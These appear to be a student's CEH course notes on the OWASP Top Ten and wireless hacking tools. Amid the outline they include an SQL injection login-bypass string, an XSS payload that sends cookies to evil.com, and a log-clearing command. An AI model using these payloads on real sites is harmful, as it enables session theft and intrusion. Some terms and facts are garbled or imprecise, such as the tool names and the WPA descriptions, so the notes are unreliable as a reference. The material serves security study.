
# CEHv13 Class 9 Notes

# Hacking Web Applications

## Topics Covered
- SQL Injection
- Hacking Wireless Networks
- Hacking Mobile Platforms

### Tools
- zaproxy
- Checkmarx
- synk
- accnitex

---

## OWASP Top Ten

- [OWASP Top Ten Project](https://owasp.org/www-project-top-ten/)
- ![OWASP Mapping](https://owasp.org/www-project-top-ten/assets/images/mapping.png)

### A01:2021 - Broken Access Control
- RBAC - Role Based Access Control
- MAC - Mandatory Access Control
- Privilege Escalation - Admin Control

### A02:2021 - Cryptographic Failures
1. Weak Encryption Algorithms
2. Lack of Encryption

Examples: MITM, Session Hijacking, arpspoof  
Encryption Methods: HTTPS, SSH

### A03:2021 - Injection
- Input Fields: Username/Password, Comments, Search Bar, Forms

#### SQL Injection
```sql
SELECT * FROM FB_LOGIN_DATA WHERE Username='admin' OR '1'='1' && PWD='admin' OR '1'='1';
```
- Tool: sqlmap
- Prevention: Content Filtering, Whitelisting, Web Application Firewall (WAF)

#### Cross Site Scripting (XSS)
```html
<script>alert('Welcome to simplilearn')</script>
<script>window.location="http://evil.com/?cookie=" + document.cookie</script>
```
- Types: Stored XSS, Reflected XSS

#### Command Injection
Commands:
- ifconfig, ipconfig, netstat, nslookup, nmap, ping

### A04:2021 - Insecure Design
- Architecture flaws, threat modeling
- [Microsoft Threat Modeling Tool](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-getting-started)

### A05:2021 - Security Misconfiguration
1. Default Credentials
2. Unnecessary Services: 21, 22, 23, 25, 3389, 1433, 80, 443
3. Improper Error Handling
4. Open Access Controls (Least Privileges, MAC, RBAC)

### A06:2021 - Vulnerable and Outdated Components
- Risk acceptance with outdated OS like Windows XP/2007
- Preferred: Windows 10/11

### A07:2021 - Identification and Authentication Failures
- Password cracking
- Strong passwords & 2FA

### A08:2021 - Software and Data Integrity Failures
- Hashing, Digital Signatures
```
Hash examples:
- 3391ad6e1cc8c157568236ca9aee796748ec63881de4186cadd618a8fcba681f
- dac6a7381c81c02fb8f9b3720b98e88e4248f870a80e6249218995673c5faaca
```

### A09:2021 - Security Logging and Monitoring Failures
- 24/7/365 monitoring
- SOC
- `clearev`

### A10:2021 - Server-Side Request Forgery (SSRF)
- Targets: Remote resources, FTP, SSH, RDP, Local (e.g., 123.23.1.12)

---

## Wireless Hacking

### Technologies
- WIFI, Bluetooth, NFC, GSM

### Standards
- IEEE (Institute of Electrical and Electronic Engineers)
- 802.11a (Wireless Fidelity - WIFI)

### WIFI Security
- WEP - Wired Equivalent Privacy
- WPA - WiFi Protected Access
- WPA2 - WPA with AES128
- WPA3 - WPA with SHA384

### Tools
- airmon-ng
- airodump-ng
- aircrack-ng